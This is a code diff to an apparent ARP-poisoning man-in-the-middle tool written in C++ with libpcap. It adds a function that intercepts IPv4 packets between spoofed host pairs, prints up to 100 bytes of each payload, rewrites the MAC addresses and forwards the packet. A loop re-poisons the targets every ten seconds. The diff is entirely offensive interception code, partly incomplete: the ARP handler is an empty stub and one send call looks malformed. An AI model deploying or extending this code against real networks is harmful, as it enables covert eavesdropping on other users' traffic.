@@ -26,6 +26,8 @@ sem_t sem;
 pcap_t* ohandle;
 pthread_mutex_t omutex = PTHREAD_MUTEX_INITIALIZER;
 
+pthread_mutex_t stdoutmutex = PTHREAD_MUTEX_INITIALIZER;
+
 ipv4_addr my_ip;
 mac_addr my_mac;
 
@@ -64,10 +66,32 @@ void arp_recover(const ipv4_addr& sip,const ipv4_addr& tip){
 }
 
 void process_arp(arp_eth_ipv4* packet){
-	
+	int typ = packet->arptype;
+	if(s2t.find(packet->sip.word)!=s2t.end()){
+	}
 }
 
-void process_ip(ipv4_eth* packet){
+void process_ip(ipv4_eth* packet,int len){
+	if(s2t.find(packet->sip.word)==s2t.end())
+		return;
+	if(s2t[packet->sip.word].find(packet->tip.word)==s2t[packet->sip.word].end())
+		return;
+	mac_addr tmac=ip_to_mac[packet->tip.word];
+	
+	pthread_mutex_lock(&stdoutmutex);
+	std::cout<<std::string(packet->sip)<<" -> "<<std::string(packet->tip)<<" : "<<len<<"bytes\n";
+	int plen=len;if(plen>100)plen=100;
+	uint8_t* str=(uint8_t*)packet;
+	for(int i=0;i<plen;i++)
+		std::cout<< (isprint(str[i])?str[i]:'.');
+	std::cout<<'\n'<<std::endl;
+	pthread_mutex_unlock(&stdoutmutex);
+	
+	packet->src=my_mac;
+	packet->dst=tmac;
+	pthread_mutex_lock(&omutex);
+	pcap_sendpacket(ohandle,*packet,len);
+	pthread_mutex_unlock(&omutex);
 }
 
 void* process_packet(void* param){
@@ -80,7 +104,7 @@ void* process_packet(void* param){
 	else{
 		ipv4_eth* ipv4=(ipv4_eth*)(8+(uint8_t*)param);
 		if(ipv4->is_valid()){
-			process_ip(ipv4);
+			process_ip(ipv4,len);
 		}
 		//nothing to do when it is neither ipv4 nor arp
 	}
@@ -97,7 +121,6 @@ void* continue_poisoning(void* param){
 	for(;;){
 		for(auto&[s,t]:stpairs)
 			arp_poison(s,t);
-		
 		sleep(10);
 	}
 	for(auto&[s,t]:stpairs)
